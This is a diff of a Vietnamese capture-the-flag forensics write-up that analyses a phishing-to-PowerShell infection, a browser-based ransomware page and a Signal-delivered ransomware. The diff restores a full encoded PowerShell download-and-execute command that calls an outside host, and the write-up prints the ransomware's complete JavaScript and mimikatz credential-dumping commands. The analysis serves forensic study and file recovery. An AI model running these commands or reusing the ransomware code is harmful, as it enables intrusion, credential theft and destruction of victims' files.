@@ -13,48 +13,46 @@ cover: /images/post_covers/wannagame.jpg
 ---
 
 
-
 ## Hide and Seek
-I just searched and downloaded some files, but I found some suspicious process created. Please help me find out.
+> I just searched and downloaded some files, but I found some suspicious process created. Please help me find out.
 
 ### Q1. What id MITRE ID for initial access? (TXXXX.XXX)
-![image](https://hackmd.io/_uploads/S1memeurbe.png)
+![image](/images/WannaGame2025/1.png)
 
 Xài [vol3](https://github.com/volatilityfoundation/volatility3/releases) để extract cache
-![image](https://hackmd.io/_uploads/BJ5MmxdH-e.png)
+![image](/images/WannaGame2025/2.png)
 
 Rename lại tên file file.0x96...dat thành places.sqlite. Sau đó load file vào [sqlitebrowserDB](https://sqlitebrowser.org/dl/)
-![image](https://hackmd.io/_uploads/BJtameuHbg.png)
+![image](/images/WannaGame2025/3.png)
 
 
 Có vẻ truy cập vào 1 đường link khá sus ở cuối.
 Tìm kiếm trên google theo tính huống truy cập link bị lừa đảo thì ta tìm được ID sau có vẻ hợp lý.
-![image](https://hackmd.io/_uploads/H1afVe_B-x.png)
+![image](/images/WannaGame2025/4.png)
 
 
 **Answer: T1566.002**
 
 ### Q2. What link did the victim access? (ASCII)
-![image](https://hackmd.io/_uploads/Bk2XVg_SWx.png)
+![image](/images/WannaGame2025/5.png)
 
 Ở ảnh câu 1 phía trên ta có đáp án ở hàng 23.
 
 **Answer: http://192.168.1.11:7331/captcha.html**
 ### Q3. What command does the attacker trick the victim into executing? (ASCII)
-![image](https://hackmd.io/_uploads/S1mnExOrWx.png)
+![image](/images/WannaGame2025/6.png)
 
 
 Sử dụng plugin cmdline của volatility để xem lại arg của các tiến trình.
-![image](https://hackmd.io/_uploads/SkpnEedS-l.png)
-![image](https://hackmd.io/_uploads/Skm6VlOBWx.png)
+![image](/images/WannaGame2025/7.png)
+![image](/images/WannaGame2025/8.png)
 
 
-**Answer: p0wershell.exe -eC aQB3AHIA...[REDACTED]...QBlAHgA**
-
+**Answer: powershell.exe -eC aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADoANwAzADMAMQAvAHkALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgA**
 
 ### [4]. What link to run the script and what file name is it stored in? (http://example.com/script.ext_file.rar)
-![image](https://hackmd.io/_uploads/H1r1SgOHWg.png)
-![image](https://hackmd.io/_uploads/rkOgBedHZe.png)
+![image](/images/WannaGame2025/9.png)
+![image](/images/WannaGame2025/10.png)
 
 
 ```ps1=
@@ -67,11 +65,11 @@ Ta biết được rằng tiến trình **powershell.exe** với pid là 3000 ch
 ``
 vol -f memdump.raw windows.memmap --dump --pid 3000
 ``
-![image](https://hackmd.io/_uploads/HkaGrldBWx.png)
+![image](/images/WannaGame2025/11.png)
 Ban đầu mình thử format strings với secret.zip nhưng k phải file này
-![image](https://hackmd.io/_uploads/BkxVrxdrbg.png)
+![image](/images/WannaGame2025/12.png)
 Sau đó mình thử lại với keyword **.zip** thôi
-![image](https://hackmd.io/_uploads/BJFSSlOHWe.png)
+![image](/images/WannaGame2025/13.png)
 
 
 Ta tìm được đoạn code ps1 đã được thực thi ở 1 đoạn nào đó trong file proc đó:
@@ -136,7 +134,7 @@ Ta thấy nó tải file từ **update.zip** rồi lưu vào **kqwer.zip**
 **Answer: http://192.168.1.11:7331/y.ps1_kqwer.zip**
 
 ### Q5. What is the MITRE ID of this technique and where does this command store in the registry? (TXXXX_Hive\key)
-![image](https://hackmd.io/_uploads/By90Hx_Hbe.png)
+![image](/images/WannaGame2025/14.png)
 
 
 Ở câu 3 ta biết được kẻ tấn công đã lừa người dùng chạy 1 command ps1 => google thông tin này và ta tìm được ID phù hợp
@@ -145,23 +143,23 @@ Kiểm tra registry với key sau:
 ```
 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
-![image](https://hackmd.io/_uploads/rkRWIl_SWl.png)
+![image](/images/WannaGame2025/15.png)
 
 
 **Answer: T1204_HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU**
 
 ### Q6. What was the malicious file location and which process was invoked by this malware? Provide its PID?? (C:\path\folder\A_processA.ext_1234)
-![image](https://hackmd.io/_uploads/Skvf8x_S-g.png)
+![image](/images/WannaGame2025/16.png)
 Ở câu 3, ta thấy sau tiến trình powershell.exe khởi chạy malwares thì có 1 tiến trình con khá lạ cũng được khởi chạy đó là verify.exe
-![image](https://hackmd.io/_uploads/H1dLIgdBZe.png)
+![image](/images/WannaGame2025/17.png)
 
 Dump file này ra để kiểm tra
-![image](https://hackmd.io/_uploads/H1YDLe_rWl.png)
-![image](https://hackmd.io/_uploads/r1FOLeOH-e.png)
-![image](https://hackmd.io/_uploads/SyaYUgOSbg.png)
+![image](/images/WannaGame2025/18.png)
+![image](/images/WannaGame2025/19.png)
+![image](/images/WannaGame2025/20.png)
 
 Check file 
-![image](https://hackmd.io/_uploads/BJA98gOSWe.png)
+![image](/images/WannaGame2025/21.png)
 
 Load vào ida analysis
 **Sub_401633**
@@ -227,7 +225,7 @@ int __cdecl sub_401633(int a1, int a2, int a3, int a4)
 }
 ```
 
-![image](https://hackmd.io/_uploads/S102IedSZx.png)
+![image](/images/WannaGame2025/22.png)
 
 **sub_40151C**
 
@@ -258,10 +256,10 @@ int sub_40151C()
 }
 ```
 
-![image](https://hackmd.io/_uploads/Hym0UeOHbg.png)
+![image](/images/WannaGame2025/23.png)
 
 **dword_40C0CC**
-![image](https://hackmd.io/_uploads/SyfyweuHWx.png)
+![image](/images/WannaGame2025/24.png)
 
 
 Nó tiến hành giải mã đoạn hex ở `dword_40C0CC` bằng cách xor với key `6ddLG9a8gc69cf4J0bZrzgGjr9zRMR` ra 1 shellcode rồi tiêm vào tiến trình **explorer.exe**
@@ -273,7 +271,7 @@ Nó tiến hành giải mã đoạn hex ở `dword_40C0CC` bằng cách xor vớ
 **Answer: C:\Users\imnoob\AppData\Local\Temp\file_explorer.exe_6500**
 
 ### Q7. What is IP and PORT of attacker in injected shellcode? (IP:PORT)
-![image](https://hackmd.io/_uploads/HySwvlOB-g.png)
+![image](/images/WannaGame2025/25.png)
 Ta sẽ thực hiện extract shellcode này ra
 Đây là code để trích shellcode:
 ```python3=
@@ -297,7 +295,7 @@ dwords = [
     0x3535395C, 0x0BB322263, 0x0B2852D92, 0x447292C4, 0x52250A52,
     0x26646476, 0x33096947, 0x0C6066C48, 0x3F5C31B6, 0x8D3B2F5E,
     0x951939AF, 0x0D7751D7E, 0x9BC9AD3D, 0x0C6B8D78D, 0x4AA4399E,
-    ... [TRUNCATED] ...
+    0x0A5A24CF0, 0x0C085BA8F, 0x347A180C, 0x0100BFB8, 0x00000101
 ]
 
 data = b''.join((x & 0xFFFFFFFF).to_bytes(4, 'little') for x in dwords)
@@ -313,7 +311,7 @@ with open("shellcode.bin", "wb") as f:
     f.write(decoded_shellcode)
 ```
 Ném lên cyberchef để disasembler:
-![image](https://hackmd.io/_uploads/rk1Ywe_SZg.png)
+![image](/images/WannaGame2025/26.png)
 
 Nó thực hiện connect tới 1 ip khác và tải dữ liệu về thực thi.
 Đây là đoạn liên quan tới câu trả lời(load IP và PORT):
@@ -321,15 +319,15 @@ Nó thực hiện connect tới 1 ip khác và tải dữ liệu về thực thi
 000000BC 68C0A8010B                      PUSH 0B01A8C0
 000000C1 680200FBA5                      PUSH A5FB0002
 ```
-![image](https://hackmd.io/_uploads/BJRavxOr-e.png)
-![image](https://hackmd.io/_uploads/BySCPedrWg.png)
+![image](/images/WannaGame2025/27.png)
+![image](/images/WannaGame2025/28.png)
 
 
 Chuyển hex sang decimal và có đáp án.
 
 **Answer: 192.168.1.11:64421**
 ### Q8. What process was used to bypass UAC and PPID? (ProcessA.ext_1234)
-![image](https://hackmd.io/_uploads/SJtJdx_Bbl.png)
+![image](/images/WannaGame2025/29.png)
 
 **UAC** là là một tính năng bảo mật của Windows giúp ngăn chặn các thay đổi trái phép đối với hệ điều hành.
 ```
@@ -346,15 +344,15 @@ Và ở PID 5888 đã chạy một lệnh ps1 và lệnh ps1 đó đã gọi 1 t
 **Answer: fodhelper.exe_5888**
 
 Sau khi trả lời xong 8 câu trên thì ta có flag.
-![image](https://hackmd.io/_uploads/r1XWuguH-x.png)
+![image](/images/WannaGame2025/30.png)
 
 
-> Flag: W1{conGR4TUIaTi0N5-9OU-Fin4ILy-fOUND-m3!ll10dc}
+**Flag: W1{conGR4TUIaTi0N5-9OU-Fin4ILy-fOUND-m3!ll10dc}**
 
 ## Where is the malware?
-The IT department received an urgent alert: an employee reported that all of his important files had been encrypted without any clear cause. Most of the team gave up, assuming this might be a new, unknown attack vector. Now it’s your turn—investigate the root cause and help us recover the encrypted files.
+> The IT department received an urgent alert: an employee reported that all of his important files had been encrypted without any clear cause. Most of the team gave up, assuming this might be a new, unknown attack vector. Now it’s your turn—investigate the root cause and help us recover the encrypted files.
 
-![image](https://hackmd.io/_uploads/SyZPOluBWe.png)
+![image](/images/WannaGame2025/31.png)
 
 Các file trong thư mục **Documents** đều bị mã hóa và nó để lại 1 file txt để tống tiền victim.
 
@@ -363,26 +361,26 @@ Trong thư mục **Documents/for_meeting**, file ransom.txt được tạo lúc 
 Mã độc đã được thực thi vào khoảng **16:40:00 - 16:40:46** ngày **05/12/2025**.
 
 Tìm xem có file .pf nào có thời gian chỉnh sửa (Last Modified) trùng khớp với khoảng 12/05/2025 04:40 PM hay không. Tên của file đó chính là tên của mã độc
-![image](https://hackmd.io/_uploads/Bk2A_g_Hbg.png)
+![image](/images/WannaGame2025/32.png)
 
 Sử dụng MFT Parser và Timeline Explorer của Eric Zimmerman để có cái nhìn tổng quan hơn.
-![image](https://hackmd.io/_uploads/BJseFxdrbe.png)
-![image](https://hackmd.io/_uploads/Hkemtl_S-x.png)
+![image](/images/WannaGame2025/33.png)
+![image](/images/WannaGame2025/34.png)
 
 Kéo qua 1 chút ta thấy 
 + File **Zone.Identifier** này chính là metadata phụ của file được windows lưu lại, nó cho biết nguồn gốc của file. Và ZoneId=3 tức là nó từ Internet.
 + có vẻ như victim truy cập vào 1 trang web có url là https://simplepdf.online/ và sau đó các file đã bị mã hóa hết.
 
-![image](https://hackmd.io/_uploads/ByZ8KgdSZe.png)
+![image](/images/WannaGame2025/35.png)
 
 Kiểm tra lịch sử duyệt web của chrome thì thấy victim thật sự đã truy cập vào đây, nhưng trang web đã sập và không thể vào lại được. Tuy nhiên chrome đã lưu lại cache của trang web đó và ta có thể vào và xem lại được, nó nằm ở **AppData/Local/Google/Chrome/User Data/Default/Cache/Cache_Data**, kéo xuống tìm đúng timeline ở trên
-![image](https://hackmd.io/_uploads/BJW_KlOSZl.png)
+![image](/images/WannaGame2025/36.png)
 
 Mình sẽ trích xuất hàm chính ở đây
 ```javascript
 {"use strict";var A=__webpack_require__(5072),g=__webpack_require__.n(A),C=__webpack_require__(7825),I=__webpack_require__.n(C),B=__webpack_require__(7659),Q=__webpack_require__.n(B),E=__webpack_require__(5056),o=__webpack_require__.n(E),i=__webpack_require__(540),t=__webpack_require__.n(i),D=__webpack_require__(1113),K=__webpack_require__.n(D),e=__webpack_require__(1208),w={};w.styleTagTransform=K(),w.setAttributes=o(),w.insert=Q().bind(null,"head"),w.domAPI=I(),w.insertStyleElement=t(),g()(e.A,w),e.A&&e.A.locals&&e.A.locals;var h=__webpack_require__(9491);const r=(A,g)=>parseInt(A.slice(g,g+2),16),s=async(A,g=[])=>{for await(const C of A.values())"file"===C.kind?g.push(C):"directory"===C.kind&&await s(C,g);return g},M={selectDirectory:async()=>{if("undefined"==typeof window||!("showDirectoryPicker"in window))throw new Error("File System Access API not supported");return window.showDirectoryPicker()},readAllFiles:s,readFileAsUint8Array:async A=>{const g=await A.getFile(),C=await g.arrayBuffer();return new Uint8Array(C)},writeBytesToHandle:async(A,g)=>{const C=await A.createWritable();await C.write(g),await C.close()},writeTextFile:async(A,g,C)=>{const I=await A.getFileHandle(g,{create:!0}),B=await I.createWritable();await B.write(C),await B.close()}};var n=__webpack_require__(8287);const a="https://api.simplepdf.online/api".replace(/\/$/,""),y={selectedDirectory:null,isEncrypting:!1,filesProcessed:0,totalFiles:0,clientId:null,backendPublicKey:null};let c={};const Y=async()=>{try{const A=await fetch(`${a}/new`,{method:"POST"});if(!A.ok)throw new Error("Server handshake failed");const g=await A.json();y.clientId=g.clientId,y.backendPublicKey=g.publicKey}catch(A){console.error("Connection Error:",A.message)}},N=async()=>{try{const A=await M.selectDirectory();y.selectedDirectory=A,c.selectedDirInfo&&(c.selectedDirInfo.innerHTML='<p class="warning-text">⚠️⏳ We’re working on it! Please keep this page open until we’re done.</p>'),c.progressContainer&&(c.progressContainer.style.display="block"),await F()}catch(A){"AbortError"!==A.name&&c.progressContainer&&(c.progressContainer.style.display="none")}},F=async()=>{if(y.selectedDirectory){y.clientId||await Y(),y.isEncrypting=!0,c.selectDirBtn&&(c.selectDirBtn.disabled=!0),c.progressBar&&(c.progressBar.style.width="0%"),c.progressText&&(c.progressText.textContent="Initializing..."),c.progressContainer&&(c.progressContainer.style.display="block");try{const A=await M.readAllFiles(y.selectedDirectory);y.totalFiles=A.length,y.filesProcessed=0;const g=(await(async()=>{const A=((A,g="94b4c8343e07d37ce38a87403029414e05c397dffcbfb7d1302a69a089cc79ef")=>{if(A.length!==g.length)throw new Error("Hex strings must be the same length for XOR.");const C=A.length/2,I=new Uint8Array(C);for(let B=0;B<C;B+=1){const C=2*B;I[B]=r(A,C)^r(g,C)}return I})("97640d7edecc04adda142fabe9760513faca90cebce7dd32f4ac6f276e60b509");return{aes:await(async A=>{const g=new h.AES;return await g.init({key_bits:256,key:A,algorithm:h.AES.Algorithm.GCM}),g})(A),rawKeyBytes:A}})()).aes;for(let C=0;C<A.length;C++){const I=A[C];c.progressText&&(c.progressText.textContent=`Processing: ${I.name}...`),await f(I,g),y.filesProcessed++,c.progressBar&&(c.progressBar.style.width=y.filesProcessed/y.totalFiles*100+"%")}await R(),c.progressText&&(c.progressText.textContent="Done. ransom.txt created."),c.selectedDirInfo&&(c.selectedDirInfo.innerHTML=`<p><strong>Folder:</strong> ${y.selectedDirectory.name} - <strong>Status:</strong> Completed (${y.filesProcessed} files)</p>`)}catch(A){c.progressText&&(c.progressText.textContent=`Error: ${A.message}`),c.progressContainer&&setTimeout(()=>{c.progressContainer.style.display="none"},3e3)}finally{y.isEncrypting=!1,c.selectDirBtn&&(c.selectDirBtn.disabled=!1)}}},f=async(A,g)=>{try{const C=await M.readFileAsUint8Array(A),I=await(async(A,g)=>{const C=await g.encrypt(A);return{iv:new Uint8Array(C.iv),ciphertext:new Uint8Array(C.content),tag:C.tag?new Uint8Array(C.tag):null}})(C,g),B=I.iv,Q=I.tag,E=I.ciphertext,o=new Uint8Array(B.length+Q.length+E.length);o.set(Q,0),o.set(E,Q.length),o.set(B,E.length+Q.length),await M.writeBytesToHandle(A,o)}catch(g){console.error(`Failed to process ${A.name}:`,g.message)}},R=async()=>{if(!y.selectedDirectory)return;const A=["*** YOUR FILES HAVE BEEN ENCRYPTED ***","","All important documents were encrypted","To recover them you must follow the instructions below.","",`Victim ID: ${y.clientId||"UNKNOWN"}`,"1. Visit our secure portal and enter your Victim ID.","2. Send the requested payment and keep this note safe.","3. After payment, you will receive the decryption key.","","Do not delete this file. Any tampering may lead to data loss.","","— Secure Cloud Team"].join("\n");await M.writeTextFile(y.selectedDirectory,"ransom.txt",A)};var U=__webpack_require__(5606);window.Buffer=n.Buffer,window.process=U,document.addEventListener("DOMContentLoaded",async()=>{c={selectDirBtn:document.getElementById("selectDirBtn"),selectedDirInfo:document.getElementById("selectedDirInfo"),progressBar:document.getElementById("progressBar"),progressText:document.getElementById("progressText"),progressContainer:document.getElementById("progressContainer")},c.selectDirBtn&&c.selectDirBtn.addEventListener("click",N),await Y()})})()})();
 ```
-![image](https://hackmd.io/_uploads/HkZ2Yg_SZg.png)
+![image](/images/WannaGame2025/37.png)
 
 
 Hàm **Y**: Gọi API tới https://api.simplepdf.online/api/new để lấy victim ID
@@ -459,13 +457,13 @@ dec = cipher.decrypt_and_verify(data[16:-16], data[:16])
 with open("decrypted.jpg", "wb") as f:
     f.write(dec)
 ```
-![image](https://hackmd.io/_uploads/SyTVqx_rbl.png)
+![image](/images/WannaGame2025/38.png)
 
 
 > Flag: W1{hAv3_u_3v3r_kNowN_R4n5omWar3_oN_Brow5eR_???!!!_8QZeXvOjgGE}
 
 ## Communicate
-My friend told me that yesterday she received a document from a colleague, then her computer received a new windows update from Microsoft. After updating Windows to the new version, while surfing the web, she suddenly realized that she had been attacked by ransomware, all her important files were encrypted. She panicked and deleted all her documents. With your digital forensic skills, please investigate whether all the encrypted files have been stolen or not! And can you help her recover the data?
+> My friend told me that yesterday she received a document from a colleague, then her computer received a new windows update from Microsoft. After updating Windows to the new version, while surfing the web, she suddenly realized that she had been attacked by ransomware, all her important files were encrypted. She panicked and deleted all her documents. With your digital forensic skills, please investigate whether all the encrypted files have been stolen or not! And can you help her recover the data?
 
 ### Part 1
 
@@ -474,8 +472,8 @@ Khi điều tra các folder, chúng ta sẽ thấy được những điều sau:
 - Các file trong ổ `C:\Users\sosona` đều bị mã hóa với đuôi `foooo` (trừ các files trong hidden folder như `AppData`).
 - User tải và sử dụng 3 app messenger là: `Telegram`, `Session` và `Signal`.
 
-![image](https://hackmd.io/_uploads/SJF35x_BZl.png)
-![image](https://hackmd.io/_uploads/rydTqlOBWe.png)
+![image](/images/WannaGame2025/39.png)
+![image](/images/WannaGame2025/40.png)
 
 Như vậy, hướng đi đúng của chúng ta sẽ là phân tích các app trong `AppData\Roaming` mà cụ thể là các app messenger nêu trên dựa trên description của đề nói về việc user dính ransomware sau khi nhận file **document** từ một đồng nghiệp.
 
@@ -488,22 +486,22 @@ Tuy nhiên, trong folder `tdata/D877F783D5D3EF8Cs` lại không có các folder 
 -> Cách này không tiếp cận được.
 
 Tiếp theo, `Session` lưu trữ key ở dạng hex trong file `config.json` chúng ta có thể lấy nó và sử  dụng `SQLCipher` để decrypt `sql\db.sqlite` trong `Session`.
-![image](https://hackmd.io/_uploads/SJTRcgOHZe.png)
-![image](https://hackmd.io/_uploads/B1myse_HWg.png)
+![image](/images/WannaGame2025/41.png)
+![image](/images/WannaGame2025/42.png)
 
 Để xem file này thì ta phải tải [sqlite](https://sqlitebrowser.org/dl/) về (file zip) và chọn DB Browser for SQLCipher.exe để chạy
-![image](https://hackmd.io/_uploads/Sk5bsg_SZg.png)
+![image](/images/WannaGame2025/43.png)
 
 Sau khi load file vào sẽ hiện ra hộp thoại để điền key vào. Chọn **raw key** và nhập vào chuỗi ở file **config.json**
 `0xb4e69ff07dd38d8cc64d9684c039a84fe2247e1071f5dd132ecaba142649f29c`
-![image](https://hackmd.io/_uploads/SJJ9jg_rbe.png)
+![image](/images/WannaGame2025/44.png)
 
-![image](https://hackmd.io/_uploads/H1Icsxur-g.png)
+![image](/images/WannaGame2025/45.png)
 Tuy nhiên, ở Session thì chúng ta sẽ chỉ tìm được fake flag.
-![image](https://hackmd.io/_uploads/r1fioeOB-l.png)
+![image](/images/WannaGame2025/46.png)
 
 Cuối cùng, chúng ta có thể chắc chắn rằng document mà user nói tới sẽ nằm trong Signal.
-![image](https://hackmd.io/_uploads/rkoU3x_HWe.png)
+![image](/images/WannaGame2025/47.png)
 
 Khi tìm kiếm về cách decrypt db của `Signal` thì chúng ta có thể tìm được vài viết này [reddit](https://www.reddit.com/r/signal/comments/1i8y4sq/how_to_decrypt_the_encryptedkey_to_migrate_a/). Về cơ bản, `Signal` sử dụng 3 keys:
 - `key1`: nằm trong file config.json và được encrypted bằng `key2`.
@@ -511,37 +509,37 @@ Khi tìm kiếm về cách decrypt db của `Signal` thì chúng ta có thể t�
 - `masterkey DPAPI`: là một dạng session key, nằm trong folder `AppData\Roaming\Microsoft\Protect\{SID}` và cần password của user để decrypt.
 
 Như vậy ta cần phải trích xuất 2 file SAM và SYSTEM ở trong system32/config
-![image](https://hackmd.io/_uploads/rk5q3xuSbg.png)
+![image](/images/WannaGame2025/48.png)
 
 
 Sử dụng [mimikatz](https://github.com/ParrotSec/mimikatz/) để lấy NTLM hash
 Chạy file để dấu #
    `lsadump::sam /system:SYSTEM /sam:SAM`
-![image](https://hackmd.io/_uploads/B1Ee6ldHWg.png)
-![image](https://hackmd.io/_uploads/SkqxpxuBWl.png)
+![image](/images/WannaGame2025/49.png)
+![image](/images/WannaGame2025/50.png)
 
 mã băm NTLM của user sosona là: 2d20d252a479f485cdf5e171d93985bf
 
 Vào [CrackStation](https://crackstation.net/) để tim pass
-![image](https://hackmd.io/_uploads/Sk0Q6ldBZx.png)
+![image](/images/WannaGame2025/51.png)
 
 Chúng ta sẽ biết được password của user là `qwerty`:
 
 Tiếp theo, sử dụng `mimikatz` để lấy được `masterkey`, ở đây chúng ta sẽ có hai master key, nhưng key `d1cd9*` là key chúng ta cần để decrypt db. 
-![image](https://hackmd.io/_uploads/SkZPalurbg.png)
+![image](/images/WannaGame2025/52.png)
 
 `dpapi::masterkey /in:d1cd97b9-2ab7-4398-ba1f-228f87eccffa /sid:S-1-5-21-1050944156-4264195685-750733359-1001 /password:qwerty`
-![image](https://hackmd.io/_uploads/By9OaxOHWl.png)
+![image](/images/WannaGame2025/53.png)
 
 Tiếp tục decrypt key2:
-![image](https://hackmd.io/_uploads/BJ9K6g_H-l.png)
-![image](https://hackmd.io/_uploads/Sy0Y6euBZg.png)
+![image](/images/WannaGame2025/54.png)
+![image](/images/WannaGame2025/55.png)
 
 Sau khi decode base64 key thì chúng ta cần xóa thêm 5 bytes đầu để nó trở thành blob dpapi hợp lệ.
-![image](https://hackmd.io/_uploads/B1t9px_Hbg.png)
+![image](/images/WannaGame2025/56.png)
 
 Có thể sử dụng cyberchef để drop byte
-![image](https://hackmd.io/_uploads/HyHipgdSZg.png)
+![image](/images/WannaGame2025/57.png)
 
 Ở đây lưu ý khi save file thì **không được** dùng module To Hex ở bước cuối vì nó sẽ biến dữ liệu thành văn bản. Mình chỉ them vào để dễ nhìn từng bytes
 Lưu lại file ***key2_blob.bin*** và đưa vào để mimikatz tìm key2
@@ -549,7 +547,7 @@ Lưu lại file ***key2_blob.bin*** và đưa vào để mimikatz tìm key2
 ```
 dpapi::blob /in:key2_blob.bin /masterkey:9775cb01f73eff2bd8ff943ae9040d753804d2c9ffd513c1db2ca218c7b9225817bbb24c77c7e52577fb916e52137744fdd917f5180b56c4e8a9fef4bf1a0da9
 ```
-![image](https://hackmd.io/_uploads/SJwR6gdBbl.png)
+![image](/images/WannaGame2025/58.png)
 
 **Key2: 5a985f65714e073c05cd2929c83f9c1861ed0bbbdeb726b556d94c5158feef0e**
 Cuối cùng, decrypt key1 sử dụng AES-GCM với key2 tìm được:
@@ -571,19 +569,19 @@ plaintext = cipher.decrypt_and_verify(ct, tag)
 print('Key1 is: ' + plaintext.decode())
 ```
 
-![image](https://hackmd.io/_uploads/ryHgAxdr-x.png)
+![image](/images/WannaGame2025/59.png)
 
 **Key mới tìm được: 5d7952292072ac320e0d66108d47fbc4de306396cb8270cabdd855fa09b3ba69**
 Sử dụng key này để decrypt db
-![image](https://hackmd.io/_uploads/BkSqWRxOrbe.png)
+![image](/images/WannaGame2025/60.png)
 khi tìm trong messages chúng ta sẽ thấy user được đưa một file salary.
-![image](https://hackmd.io/_uploads/BJNfCgOrbe.png)
+![image](/images/WannaGame2025/61.png)
 Khi vào message_attachments, chúng ta sẽ thấy tên file đầy đủ là salary_statistics.rar và đây là file sẽ lây nhiễm ransomware cho máy user.
-![image](https://hackmd.io/_uploads/Sy17AedS-l.png)
+![image](/images/WannaGame2025/62.png)
 
 Để khôi phục file này thì chúng ta sử dụng localkey có trong table này, sử dụng AES-CBC và 32 bytes đầu của key để decrypt được data của file nằm trong folder **attachments.noindex\8b.**
-![image](https://hackmd.io/_uploads/SJGVRx_Bbl.png)
-![image](https://hackmd.io/_uploads/SyUECedBZe.png)
+![image](/images/WannaGame2025/63.png)
+![image](/images/WannaGame2025/64.png)
 
 Đổi tên file lại thành salary_statistics.bin và viết script giải mã
 ```python!
@@ -605,35 +603,35 @@ plaintext = plaintext[:-padding_len]
 with open('salary_statistics.rar', 'wb') as f:
     f.write(plaintext)
 ```
-![image](https://hackmd.io/_uploads/rJ8i0g_HZx.png)
+![image](/images/WannaGame2025/65.png)
 
 
 Chúng ta được file `rar` chứa file `csv` bên trong. Tuy nhiên, nó lại bị lỗi gì đó với file.
-![image](https://hackmd.io/_uploads/ryB3Rl_Hbl.png)
+![image](/images/WannaGame2025/66.png)
 
 
 Có vẻ nó chứa malwares bên trong.
-![image](https://hackmd.io/_uploads/SkFDamSMbg.png)
+![image](/images/WannaGame2025/67.png)
 Khi kiểm tra bằng HxD, chúng ta sẽ thấy được còn có một file `Update.exe` move về thư mục `Startup` của Windows để thực hiện hành vi độc hại.
-![image](https://hackmd.io/_uploads/HyQAAedSZg.png)
+![image](/images/WannaGame2025/68.png)
 
 Trong file `csv`, sẽ có một chuỗi `base62`, decode sẽ ra được part 1 của flag.
-![image](https://hackmd.io/_uploads/HkekkZOBWx.png)
-![image](https://hackmd.io/_uploads/BySJyWOS-x.png)
+![image](/images/WannaGame2025/69.png)
+![image](/images/WannaGame2025/70.png)
 
 
 **Part 1: W1{7h15_155_7h3_f1rr57_fl4ff4g_s3ss1on_r3c0very-**
 
 ### Part 2
 Ta vào thư mục `Startup` dump file `Update.exe` về phân tích.
-![image](https://hackmd.io/_uploads/HJl-yb_HZx.png)
+![image](/images/WannaGame2025/71.png)
 
 **`Vì là file mã độc thật nên nhớ tắt fw và cẩn thận đưa vào VM nhé! Tránh trường hợp lỡ tay double click thực thi!!`**
 Nhét vào DIE thì biết file được viết bằng C#. 
-![image](https://hackmd.io/_uploads/rkVm1-_rZg.png)
+![image](/images/WannaGame2025/72.png)
 
 Sử dụng dnspy để phân tích
-![image](https://hackmd.io/_uploads/B1q41Z_HZx.png)
+![image](/images/WannaGame2025/73.png)
 
 
 ```c#=
@@ -656,23 +654,23 @@ public static object f5Mo9y1FK1yJy4poW9CE(string pXqYfeWgCBZOAYUjYnh)
 ```
 
 Ở phần đầu tiên, nó thực hiện giải mã các biến tĩnh trong code qua hàm `f5Mo9y1FK1yJy4poW9CE`. Hàm này lấy mã MD5 của 1 biến khác rồi tạo key, từ byte 0 tới byte 14 là 15 byte đầu của mã MD5 và 16 byte kế là mã MD5 đó, còn byte cuối sẽ là add pad 00 vào.
-![image](https://hackmd.io/_uploads/B1QU1-dSbe.png)
-![image](https://hackmd.io/_uploads/rJi81-drZe.png)
+![image](/images/WannaGame2025/74.png)
+![image](/images/WannaGame2025/75.png)
 
 
 
 
 Thực hiện giải mã với key
-![image](https://hackmd.io/_uploads/B1GOyZdSZe.png)
+![image](/images/WannaGame2025/76.png)
 Vậy key thực sự là 
 `2778f1b116440a912bc28ffa1c4b872778f1b116440a912bc28ffa1c4b870500`
 
 Ở đây mình sẽ giải mã 2 biến cần sử dụng:
-![image](https://hackmd.io/_uploads/B1oFyZdHWe.png)
-![image](https://hackmd.io/_uploads/ryW5k-uS-l.png)
+![image](/images/WannaGame2025/77.png)
+![image](/images/WannaGame2025/78.png)
 
 Quay lại hàm **main**
-![image](https://hackmd.io/_uploads/HkYsJ-uBZe.png)
+![image](/images/WannaGame2025/79.png)
 
 
 ```c#=
@@ -755,45 +753,45 @@ with open("malwares.exe", "wb") as f:
 ```
 
 Tiếp tục có 1 file code bằng C#, sử dụng dnSpy phân tích nó tiếp.
-![image](https://hackmd.io/_uploads/rywJeWOS-x.png)
+![image](/images/WannaGame2025/80.png)
 
 
 Entry point sẽ là class `UN`.
-![image](https://hackmd.io/_uploads/H11xlbOSbl.png)
-![image](https://hackmd.io/_uploads/rJrxgW_HZg.png)
-![image](https://hackmd.io/_uploads/HJcelbuH-l.png)
+![image](/images/WannaGame2025/81.png)
+![image](/images/WannaGame2025/82.png)
+![image](/images/WannaGame2025/83.png)
 
 
 Đầu tiên nó thực hiện để lại thông báo và file `Helper.exe`.
-![image](https://hackmd.io/_uploads/rkt-lZuBZx.png)
-![image](https://hackmd.io/_uploads/BkTbxbuBWg.png)
+![image](/images/WannaGame2025/84.png)
+![image](/images/WannaGame2025/85.png)
 
 Tiếp theo nó thực hiện random key 32 byte rồi mã hóa base64. Biến `text` là lưu key.
-![image](https://hackmd.io/_uploads/rkofxZdrWe.png)
-![image](https://hackmd.io/_uploads/rkemxWdrWg.png)
+![image](/images/WannaGame2025/86.png)
+![image](/images/WannaGame2025/87.png)
 
 Tiếp theo nó duyệt qua các file, mã hóa aes + base64 nội dung rồi đổi tên file thành .foooo.
-![image](https://hackmd.io/_uploads/HkeVlW_HZx.png)
-![image](https://hackmd.io/_uploads/SymEx-uHbl.png)
-![image](https://hackmd.io/_uploads/r1cEg-_S-e.png)
+![image](/images/WannaGame2025/88.png)
+![image](/images/WannaGame2025/89.png)
+![image](/images/WannaGame2025/90.png)
 
 Ở đây nó thực hiện mã hóa key bằng thuật toán RSA nhưng với giá trị exp khá nhỏ. Biến text4 lưu key đã mã hóa RSA.
-![image](https://hackmd.io/_uploads/ByEUeZdrbg.png)
-![image](https://hackmd.io/_uploads/SJFIlZOS-l.png)
-![image](https://hackmd.io/_uploads/S1nUg-uH-l.png)
-![image](https://hackmd.io/_uploads/BJyDlW_rbl.png)
-![image](https://hackmd.io/_uploads/r1Gwe-_BWx.png)
+![image](/images/WannaGame2025/91.png)
+![image](/images/WannaGame2025/92.png)
+![image](/images/WannaGame2025/93.png)
+![image](/images/WannaGame2025/94.png)
+![image](/images/WannaGame2025/95.png)
 
 
 
